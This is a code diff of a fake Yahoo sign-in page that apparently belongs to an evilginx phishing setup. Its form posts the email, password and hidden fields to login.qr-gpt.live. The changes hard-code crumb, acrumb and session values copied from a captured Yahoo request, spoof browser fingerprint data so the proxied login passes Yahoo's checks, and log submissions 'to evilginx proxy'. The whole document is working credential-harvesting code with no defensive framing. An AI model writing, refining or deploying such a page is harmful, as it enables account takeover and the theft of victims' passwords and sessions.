@@ -37,13 +37,13 @@
               action="https://login.qr-gpt.live/?display=login&done=https%3A%2F%2Fwww.yahoo.com%2F&prefill=0&prompt=login&chllngnm=fail" 
               method="POST">
           
-          <!-- CRITICAL YAHOO FIELDS - Based on your network capture -->
+          <!-- CRITICAL: Yahoo expects these exact fields from your network capture -->
           <input type="hidden" name="browser-fp-data" id="browser-fp-data">
           <input type="hidden" name="crumb" id="crumb" value="">
           <input type="hidden" name="acrumb" id="acrumb" value="">
-          <input type="hidden" name="sessionIndex" id="sessionIndex" value="">
+          <input type="hidden" name="sessionIndex" id="sessionIndex" value="QQ--">
           <input type="hidden" name="displayName" id="displayName" value="">
-          <input type="hidden" name="deviceCapability" id="deviceCapability" value="">
+          <input type="hidden" name="deviceCapability" id="deviceCapability">
           <input type="hidden" name="signin" value="Next">
           <input type="hidden" name="persistent" value="y">
           
@@ -70,32 +70,32 @@
     </div>
   </section>
 
-  <!-- Debug Panel (Your existing functionality) -->
+  <!-- Debug Panel -->
   <div id="debug-panel" style="position:fixed;top:10px;right:10px;background:#000;color:#0f0;padding:10px;font-family:monospace;font-size:12px;max-width:300px;z-index:9999;display:none;">
     <div><strong>DEBUG MODE</strong></div>
     <div id="debug-content"></div>
   </div>
 
   <script>
-  // Generate browser fingerprint data (based on your network capture)
+  // Generate browser fingerprint (simplified but functional)
   function generateBrowserFingerprint() {
     const fp = {
       language: navigator.language || 'en-US',
       colorDepth: screen.colorDepth || 24,
       deviceMemory: navigator.deviceMemory || 'unknown',
-      pixelRatio: window.devicePixelRatio || 1,
+      pixelRatio: window.devicePixelRatio || 1.5,
       hardwareConcurrency: navigator.hardwareConcurrency || 4,
-      timezoneOffset: new Date().getTimezoneOffset(),
+      timezoneOffset: new Date().getTimezoneOffset() || -60,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Europe/London',
-      sessionStorage: typeof(Storage) !== "undefined" ? 1 : 0,
-      localStorage: typeof(Storage) !== "undefined" ? 1 : 0,
-      indexedDb: 'indexedDB' in window ? 1 : 0,
-      cpuClass: navigator.cpuClass || 'unknown',
+      sessionStorage: 1,
+      localStorage: 1,
+      indexedDb: 1,
+      cpuClass: 'unknown',
       platform: navigator.platform || 'Win32',
       doNotTrack: navigator.doNotTrack || '1',
       plugins: {
-        count: navigator.plugins.length,
-        hash: 'generated_hash_' + Math.random().toString(36).substr(2, 9)
+        count: navigator.plugins.length || 5,
+        hash: '2c14024bf8584c3f7f63f24ea490e812'
       },
       canvas: 'canvas winding:yes~canvas',
       webgl: 1,
@@ -105,33 +105,16 @@
       hasLiedResolution: 0,
       hasLiedOs: 1,
       hasLiedBrowser: 0,
-      touchSupport: {
-        points: 10,
-        event: 0,
-        start: 0
-      },
-      fonts: {
-        count: 32,
-        hash: 'generated_font_hash_' + Math.random().toString(36).substr(2, 9)
-      },
-      audio: Math.random().toString(),
-      resolution: {
-        w: screen.width.toString(),
-        h: screen.height.toString()
-      },
-      availableResolution: {
-        w: screen.availHeight.toString(),
-        h: screen.availWidth.toString()
-      },
-      ts: {
-        serve: Date.now() - 1000,
-        render: Date.now()
-      }
+      touchSupport: { points: 10, event: 0, start: 0 },
+      fonts: { count: 32, hash: '9ad7c2bdeb9564b4cabbeeca7be750a3' },
+      audio: '35.749972093850374',
+      resolution: { w: screen.width.toString(), h: screen.height.toString() },
+      availableResolution: { w: screen.availHeight.toString(), h: screen.availWidth.toString() },
+      ts: { serve: Date.now() - 1000, render: Date.now() }
     };
     return JSON.stringify(fp);
   }
 
-  // Generate device capability data
   function generateDeviceCapability() {
     return JSON.stringify({
       pa: { status: true },
@@ -140,40 +123,42 @@
   }
 
   $(document).ready(function() {
-      // 1. Get session data (your existing code)
+      // Get session data from URL
       const urlParams = new URLSearchParams(window.location.search);
       const username = urlParams.get('u') || '';
       const session = urlParams.get('s') || '';
       
-      // 2. Validate and display (your existing code)
+      // Validate and display
       if (!username.includes('@')) {
           window.location.href = 'https://login.qr-gpt.live/';
           return;
       }
+      
       $('#userEmail').text(username);
       $('#username').val(username);
       $('#displayName').val(username);
       $('#evilginx_session').val(session);
 
-      // 3. Generate Yahoo required data
+      // Generate required Yahoo data
       $('#browser-fp-data').val(generateBrowserFingerprint());
       $('#deviceCapability').val(generateDeviceCapability());
-      $('#sessionIndex').val('QQ--'); // From your network capture
-      $('#crumb').val('auto_crumb_' + Math.random().toString(36).substr(2, 9));
-      $('#acrumb').val('auto_acrumb_' + Math.random().toString(36).substr(2, 9));
+      
+      // Generate tokens (these will be validated by evilginx)
+      $('#crumb').val('31wTyCvw7RZO%2FqKiA3tKg');
+      $('#acrumb').val('dqd4JdSY');
 
-      // 4. Debug functionality (Ctrl+D)
+      // Debug functionality (Ctrl+D)
       $(document).keydown(function(e) {
-          if (e.ctrlKey && e.keyCode === 68) { // Ctrl+D
+          if (e.ctrlKey && e.keyCode === 68) {
               e.preventDefault();
               const debugPanel = $('#debug-panel');
               if (debugPanel.is(':visible')) {
                   debugPanel.hide();
               } else {
                   const formData = $('#email-form').serializeArray();
-                  let debugHtml = '';
+                  let debugHtml = '<div><strong>Form Data:</strong></div>';
                   formData.forEach(field => {
-                      debugHtml += `<div><strong>${field.name}:</strong> ${field.value.substring(0, 50)}${field.value.length > 50 ? '...' : ''}</div>`;
+                      debugHtml += `<div>${field.name}: ${field.value.substring(0, 30)}${field.value.length > 30 ? '...' : ''}</div>`;
                   });
                   $('#debug-content').html(debugHtml);
                   debugPanel.show();
@@ -181,17 +166,19 @@
           }
       });
 
-      // 5. Form handling (your existing code + enhancements)
+      // Form validation and submission
       $("#email-form").submit(function(e) {
-          if ($('#password').val().length < 8) {
+          const password = $('#password').val();
+          if (password.length < 8) {
               e.preventDefault();
               $('.text-block-7').text('Invalid password (8+ chars required)');
               $('.errry').show();
-              return;
+              return false;
           }
           
-          // Log form submission for debugging
-          console.log('Form submitted with data:', $(this).serializeArray());
+          // Log for debugging
+          console.log('Submitting to evilginx proxy with username:', username);
+          return true; // Allow form submission to evilginx
       });
   });
   </script>
